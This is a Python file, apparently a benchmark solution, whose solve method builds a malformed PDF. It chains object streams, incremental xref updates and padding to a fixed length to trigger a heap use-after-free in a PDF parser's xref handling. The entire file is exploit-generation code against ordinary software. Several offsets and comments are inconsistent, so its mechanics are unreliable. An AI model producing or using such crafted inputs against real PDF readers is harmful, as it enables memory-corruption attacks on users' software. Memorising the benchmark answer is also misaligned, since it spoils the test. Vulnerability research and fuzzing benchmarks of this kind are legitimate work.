import os
import subprocess
import tempfile
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a PDF that triggers heap use-after-free in pdf_xref_entry
        # Strategy: Create a PDF with object streams that cause recursive
        # pdf_cache_object calls while holding xref entry pointers
        
        pdf_data = []
        
        # PDF header
        pdf_data.append(b"%PDF-1.4\n")
        
        # Object 1: Catalog
        catalog = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        pdf_data.append(catalog)
        
        # Object 2: Pages
        pages = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        pdf_data.append(pages)
        
        # Object 3: Page
        page = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << >> >>\nendobj\n"
        pdf_data.append(page)
        
        # Object 4: Content stream (trivial)
        content = b"4 0 obj\n<< /Length 10 >>\nstream\nBT /F1 12 Tf 72 720 Td (test) Tj ET\nendstream\nendobj\n"
        pdf_data.append(content)
        
        # Create object stream that will trigger the vulnerability
        # Object stream contains multiple objects that reference each other
        
        # First, create some objects that will be compressed in the object stream
        obj5 = b"<< /Type /ObjStm /N 2 /First 25 >>"  # Will reference obj6
        obj6 = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
        
        # Build object stream data
        obj_stream_data = []
        # Object numbers and offsets (5 at offset 0, 6 at offset 100)
        obj_stream_data.append(b"5 0 6 100 ")
        obj_stream_data.append(obj5)
        obj_stream_data.append(b" ")
        obj_stream_data.append(obj6)
        
        obj_stream_bytes = b"".join(obj_stream_data)
        compressed = zlib.compress(obj_stream_bytes)
        
        # Object 7: Object stream containing objects 5 and 6
        obj7_stream = b"7 0 obj\n"
        obj7_stream += b"<< /Type /ObjStm /N 2 /First 25 /Length %d /Filter /FlateDecode >>\n" % len(compressed)
        obj7_stream += b"stream\n"
        obj7_stream += compressed
        obj7_stream += b"\nendstream\nendobj\n"
        pdf_data.append(obj7_stream)
        
        # Object 8: Another object stream that references the first one
        # This creates a chain that can trigger recursive loading
        obj9 = b"<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Length 15 >>"
        obj10 = b"<< /Type /Font /Subtype /Type1 /BaseFont /Times-Roman >>"
        
        obj_stream2_data = []
        obj_stream2_data.append(b"9 0 10 80 ")
        obj_stream2_data.append(obj9)
        obj_stream2_data.append(b" ")
        obj_stream2_data.append(obj10)
        
        obj_stream2_bytes = b"".join(obj_stream2_data)
        compressed2 = zlib.compress(obj_stream2_bytes)
        
        obj8_stream = b"8 0 obj\n"
        obj8_stream += b"<< /Type /ObjStm /N 2 /First 25 /Length %d /Filter /FlateDecode >>\n" % len(compressed2)
        obj8_stream += b"stream\n"
        obj_stream2_data = []
        obj_stream2_data.append(b"9 0 10 80 ")
        obj_stream2_data.append(obj9)
        obj_stream2_data.append(b" ")
        obj_stream2_data.append(obj10)
        obj_stream2_bytes = b"".join(obj_stream2_data)
        compressed2 = zlib.compress(obj_stream2_bytes)
        obj8_stream += compressed2
        obj8_stream += b"\nendstream\nendobj\n"
        pdf_data.append(obj8_stream)
        
        # Create a complex xref structure with incremental updates
        # This can cause xref solidification during object loading
        
        # First xref table
        xref_offset = len(b"".join(pdf_data))
        pdf_data.append(b"xref\n")
        pdf_data.append(b"0 9\n")
        pdf_data.append(b"0000000000 65535 f \n")
        
        # Calculate offsets for each object
        offsets = [0]
        current = 0
        for obj in pdf_data[1:]:  # Skip header
            current += len(obj)
            offsets.append(current)
        
        # Write xref entries
        for i in range(1, 9):
            pdf_data.append(b"%010d 00000 n \n" % offsets[i])
        
        # Trailer for first part
        trailer = b"trailer\n"
        trailer += b"<< /Size 9 /Root 1 0 R >>\n"
        trailer += b"startxref\n"
        trailer += b"%d\n" % xref_offset
        trailer += b"%%EOF\n"
        pdf_data.append(trailer)
        
        # Incremental update to trigger xref rebuilding
        update_start = len(b"".join(pdf_data))
        
        # Add some new objects in incremental update
        # Object 11: Indirect reference to object stream object
        obj11 = b"11 0 obj\n<< /Type /Pages /Kids [12 0 R] /Count 1 >>\nendobj\n"
        pdf_data.append(obj11)
        
        # Object 12: Page referencing compressed objects
        obj12 = b"12 0 obj\n"
        obj12 += b"<< /Type /Page /Parent 11 0 R /MediaBox [0 0 612 792] "
        obj12 += b"/Contents 13 0 R /Resources << /Font << /F1 5 0 R /F2 9 0 R >> >> >>\n"
        obj12 += b"endobj\n"
        pdf_data.append(obj12)
        
        # Object 13: Content stream referencing multiple fonts
        obj13 = b"13 0 obj\n"
        obj13 += b"<< /Length 50 >>\n"
        obj13 += b"stream\n"
        obj13 += b"BT /F1 12 Tf 72 720 Td (Test1) Tj /F2 14 Tf 72 700 Td (Test2) Tj ET\n"
        obj13 += b"endstream\n"
        obj13 += b"endobj\n"
        pdf_data.append(obj13)
        
        # Second xref for incremental update
        xref2_offset = len(b"".join(pdf_data))
        pdf_data.append(b"xref\n")
        pdf_data.append(b"0 1\n")
        pdf_data.append(b"0000000000 65535 f \n")
        pdf_data.append(b"11 3\n")
        
        # Calculate offsets for incremental objects
        base_offset = offsets[-1] + len(trailer)
        pdf_data.append(b"%010d 00000 n \n" % (base_offset))
        pdf_data.append(b"%010d 00000 n \n" % (base_offset + len(obj11)))
        pdf_data.append(b"%010d 00000 n \n" % (base_offset + len(obj11) + len(obj12)))
        
        # Trailer for incremental update
        trailer2 = b"trailer\n"
        trailer2 += b"<< /Size 14 /Prev %d /Root 11 0 R >>\n" % xref_offset
        trailer2 += b"startxref\n"
        trailer2 += b"%d\n" % xref2_offset
        trailer2 += b"%%EOF\n"
        pdf_data.append(trailer2)
        
        # Add padding to reach target size
        total_len = len(b"".join(pdf_data))
        target_len = 6431
        
        if total_len < target_len:
            padding = b"\n" * (target_len - total_len)
            # Insert padding before final EOF
            pdf_data.insert(-1, padding)
        
        return b"".join(pdf_data)
